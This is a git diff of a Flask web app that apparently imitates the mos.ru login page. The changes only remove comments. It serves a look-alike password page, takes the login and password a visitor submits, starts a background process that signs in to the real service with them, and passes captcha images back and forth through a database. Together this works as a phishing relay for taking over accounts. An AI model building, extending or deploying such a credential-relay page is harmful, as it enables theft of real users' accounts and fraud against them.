@@ -28,11 +28,11 @@ def init_db():
     conn.close()
 
 @app.route('/sps/login/methods/password')
-def hello_world():  # put application's code here
+def hello_world():
     return render_template("mosru.html")
 
 @app.route('/api/form', methods=['GET', 'POST'])
-def form():  # put application's code here
+def form():
     login = request.json.get("login")
     password = request.json.get("password")
     if login:
@@ -41,7 +41,6 @@ def form():  # put application's code here
         print("password")
     uuid_capcha = uuid.uuid4()
 
-    # Создаем новый процесс для выполнения mosru_auth
     auth_process = Process(
         target=utils.mosru_auth,
         kwargs={
@@ -53,10 +52,9 @@ def form():  # put application's code here
         }
     )
 
-    # Запускаем процесс
+
     auth_process.start()
 
-    # Можно сразу вернуть ответ, не дожидаясь завершения процесса
     return {"status": "capcha", "uuid": uuid_capcha}
 
 
@@ -78,7 +76,7 @@ def check_captcha_ready(task_id):
 
     return jsonify({
         'status': 'ready',
-        'data_image': result[0]  # предполагаем что это текстовая капча
+        'data_image': result[0]
     })
 
 
@@ -90,7 +88,6 @@ def submit_captcha(task_id, answer):
     conn = sqlite3.connect(DB_NAME)
     cursor = conn.cursor()
 
-    # Сначала обновляем капчу в базе
     cursor.execute("""
                    UPDATE captcha_tasks
                    SET captcha_answer = ?,
